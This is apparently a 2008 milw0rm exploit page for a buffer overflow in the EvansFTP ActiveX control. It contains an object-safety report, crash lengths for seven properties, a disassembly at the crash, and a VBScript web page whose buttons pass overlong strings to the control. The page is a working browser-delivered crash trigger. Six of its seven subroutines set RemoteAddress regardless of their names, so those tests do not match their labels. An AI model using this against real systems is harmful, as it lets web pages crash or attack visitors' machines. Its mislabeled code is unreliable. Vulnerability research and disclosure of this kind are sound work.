<html><head><title>EvansFTP (EvansFTP.ocx) Remote Buffer Overflow PoC</title></head><pre>&lt;HTML&gt;
&lt;package&gt;&lt;job id='DoneInVBS' debug='false' error='true'&gt;
&lt;object classid='clsid:7E864D3E-3E6A-48F0-88AF-CEAEE322F9FD' id='beard' /&gt;
&lt;HEAD&gt;
  &lt;TITLE&gt;EvansFTP (EvansFTP.ocx) Remote Buffer Overflow PoC&lt;/TITLE&gt;
&lt;/HEAD&gt;
&lt;BODY&gt;
[+] Application : EvansFTP ActiveX &lt;br&gt;
[+] CompanyName    : Evans Programming &lt;br&gt;
[+] Description    : Multi-threaded asynchronus Active-X FTP Control&lt;br&gt;
[+] Lib GUID    : {DA3C77F4-8701-11D4-908B-00010268221D}&lt;br&gt;
[+] Exploit     : Remote BoF (PoC)&lt;br&gt;
[+] Author      : Bl@ckbe@rD // Blackbeard-sql{a.t}Hotmail{dot}fr&lt;br&gt;&lt;br&gt;
[+] Object Safety Report :&lt;br&gt;
Report for Clsid: {7E864D3E-3E6A-48F0-88AF-CEAEE322F9FD}&lt;br&gt;
RegKey Safe for Script: Faux&lt;br&gt;
RegKey Safe for Init: Faux&lt;br&gt;
Implements IObjectSafety: Vrai&lt;br&gt;
IDisp Safe:  Safe for untrusted: caller,data  &lt;br&gt;
IPStorage Safe:  Safe for untrusted: caller,data &lt;br&gt;&lt;br&gt;
RegKey Safe for Script: Faux&lt;br&gt;
RegkeySafe for Init: Faux&lt;br&gt;
KillBitSet: Faux&lt;br&gt;
&lt;br&gt;&lt;br&gt;
The Proprieties (RemoteAddress,ProxyPrefix,ProxyName,Password,ProxyBypassList,LoginName,CurrentDirectory) suffers from Buffer Overflow when we pass long strings in fact : &lt;br&gt;
1- RemoteAddress    suffers from a BoF when we pass a string over 2068  &lt;br&gt;
2- ProxyPrefix      suffers from a BoF when we pass a string over 1044  &lt;br&gt;
3- ProxyName        suffers from a BoF when we pass a string over 1044   &lt;br&gt;
4- Password         suffers from a BoF when we pass a string over 1044   &lt;br&gt;
5- ProxyBypassList  suffers from a BoF when we pass a string over 1044   &lt;br&gt;
6- LoginName        suffers from a BoF when we pass a string over 1044   &lt;br&gt;
7- CurrentDirectory suffers from a BoF when we pass a string over 1044   &lt;br&gt;&lt;br&gt;
DisASM RemoteAddress Crash :&lt;br&gt;&lt;pre&gt;
7C809EEC    MOV AL,[EDX]    (KERNEL32.dll)
 
7C809ED4    TEST EDX,EDX
7C809ED6    JE 7C80C858
7C809EDC    LEA EDI,[EDX+EAX-1]
7C809EE0    CMP EDI,EDX
7C809EE2    JB 7C80C858
7C809EE8    AND DWORD PTR [EBP-4],0
7C809EEC    MOV AL,[EDX]      &lt;--- CRASH
 
EBP+8    FEEEFEEE
Stack Dump:
13FC18      A7 F3 01 66 EE FE EE FE 04 00 00 00 02 00 00 00
 
&lt;/pre&gt;
&lt;script language='vbscript'&gt;
Sub RemoteAddress
arg1=String(2068, &quot;A&quot;)
beard.RemoteAddress = arg1
End Sub
 
Sub ProxyPrefix
arg1=String(1044, &quot;A&quot;)
beard.RemoteAddress = arg1
End Sub
 
Sub ProxyName
arg1=String(1044, &quot;A&quot;)
beard.RemoteAddress = arg1
End Sub
 
Sub Password
arg1=String(1044, &quot;A&quot;)
beard.RemoteAddress = arg1
End Sub
 
Sub ProxyBypassList
arg1=String(1044, &quot;A&quot;)
beard.RemoteAddress = arg1
End Sub
 
Sub LoginName
arg1=String(1044, &quot;A&quot;)
beard.RemoteAddress = arg1
End Sub
 
Sub CurrentDirectory
arg1=String(1044, &quot;A&quot;)
beard.RemoteAddress = arg1
End Sub
&lt;/script&gt;&lt;br&gt;&lt;br&gt;
 
&lt;INPUT TYPE=&quot;button&quot; VALUE=&quot;RemoteAddress PoC&quot; ONCLICK=RemoteAddress()&gt;
&lt;INPUT TYPE=&quot;button&quot; VALUE=&quot;ProxyPrefix PoC&quot; ONCLICK=ProxyPrefix()&gt;
&lt;INPUT TYPE=&quot;button&quot; VALUE=&quot;ProxyName  PoC&quot; ONCLICK=ProxyName()&gt;
&lt;INPUT TYPE=&quot;button&quot; VALUE=&quot;Password PoC&quot; ONCLICK=Password()&gt;
&lt;INPUT TYPE=&quot;button&quot; VALUE=&quot;ProxyBypassList PoC&quot; ONCLICK=ProxyBypassList()&gt;
&lt;INPUT TYPE=&quot;button&quot; VALUE=&quot;LoginName PoC&quot; ONCLICK=LoginName()&gt;
&lt;INPUT TYPE=&quot;button&quot; VALUE=&quot;CurrentDirectory PoC&quot; ONCLICK=CurrentDirectory()&gt;&lt;br&gt;&lt;br&gt;
Brought to You by Bl@ckbe@rD&lt;br&gt;
Peace xD
 &lt;/BODY&gt;
&lt;/HTML&gt;

# milw0rm.com [2008-12-14]</pre></html>